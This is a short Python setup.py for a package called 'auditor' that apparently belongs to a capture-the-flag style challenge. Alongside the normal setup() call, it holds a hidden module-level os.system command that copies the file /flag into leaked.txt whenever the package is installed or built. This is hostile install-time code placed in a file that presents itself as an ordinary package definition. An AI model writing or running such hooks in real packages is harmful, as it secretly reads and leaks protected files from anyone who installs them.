from setuptools import setup
import os

os.system("cat /flag > leaked.txt")

setup(
    name="auditor",
    version="0.1"
)
